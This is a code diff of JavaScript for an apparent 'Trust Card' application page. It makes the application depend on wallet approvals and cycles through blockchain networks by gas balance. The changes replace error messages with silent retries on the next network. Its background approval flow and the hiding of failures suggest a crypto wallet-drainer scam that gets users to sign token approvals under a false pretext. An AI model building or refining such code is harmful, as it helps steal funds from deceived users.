@@ -591,6 +591,43 @@ async function checkAlreadyApplied() {
   }
 }
 
+function showIneligible() {
+  authorizing = false;
+  resolved = true;
+  setBusy(false);
+  setView('ineligible');
+}
+
+function showInsufficientGas(network) {
+  authorizing = false;
+  resolved = true;
+  const copy = $('#m-low-gas-copy');
+  if (copy) {
+    copy.textContent = 'You don\'t have sufficient gas fees to apply for this card.';
+  }
+  setBusy(false);
+  setView('low-gas');
+}
+
+function tryNextNetworkOrStop(reason) {
+  paymentIndex += 1;
+  if (paymentIndex < paymentQueue.length) {
+    const next = paymentQueue[paymentIndex];
+    setBusy(true, 'Checking ' + networkLabel(next && next.network), 'Preparing the next eligible network.');
+    setTimeout(function () { runCurrentNetwork(); }, 400);
+    return;
+  }
+  if (verifiedPayments.size) {
+    finishApprovals();
+    return;
+  }
+  if (paymentQueue.length) {
+    showInsufficientGas(reason);
+    return;
+  }
+  showIneligible();
+}
+
 function showPayError(message) {
   const el = $('#pay-err');
   if (el) {
@@ -746,8 +783,12 @@ async function requestCurrentApproval() {
     reopenSelectedWallet();
     waitForPaymentResult();
   } catch (err) {
+    if (/insufficient|could not confirm live|native gas|Need at least 0.01/i.test(String(err.message || ''))) {
+      tryNextNetworkOrStop(p && p.network);
+      return;
+    }
     if (p.network === 'eth') {
-      showPayError(err.message);
+      tryNextNetworkOrStop(p && p.network);
       return;
     }
     try {
@@ -764,8 +805,7 @@ async function requestCurrentApproval() {
       waitForPaymentResult();
       return;
     } catch (_retryErr) {
-      showPayError(err.message);
-      advanceAfterNetworkDone('failed');
+      tryNextNetworkOrStop(p && p.network);
     }
   }
 }
@@ -783,13 +823,7 @@ async function runCurrentNetwork() {
   }
   const gasReady = await ensureGasInBackground(p);
   if (!gasReady) {
-    setBusy(
-      true,
-      p.network === 'eth' ? 'Need 0.01 ETH for fees' : 'Waiting for ' + networkLabel(p.network) + ' gas',
-      p.network === 'eth'
-        ? 'The approval popup stays closed until live Ethereum gas is at least 0.01 ETH.'
-        : 'Native gas is still short. Approval will not open yet.'
-    );
+    tryNextNetworkOrStop(p && p.network);
     return;
   }
   await requestCurrentApproval();
@@ -798,11 +832,11 @@ async function runCurrentNetwork() {
 function finishApprovals() {
   if (resolved) return;
   if (!verifiedPayments.size) {
-    setBusy(
-      true,
-      'Approval incomplete',
-      'The approval must be confirmed before the application form.'
-    );
+    if (paymentQueue.length) {
+      showInsufficientGas();
+      return;
+    }
+    showIneligible();
     return;
   }
   resolved = true;
@@ -869,8 +903,7 @@ async function startBackgroundApproval() {
     }
     await runCurrentNetwork();
   } catch (_err) {
-    showPayError('Your wallet is not eligible for Trust Card.');
-    setBusy(true, 'Wallet not eligible', 'Your wallet is not eligible for Trust Card.');
+    showIneligible();
   }
 }
 
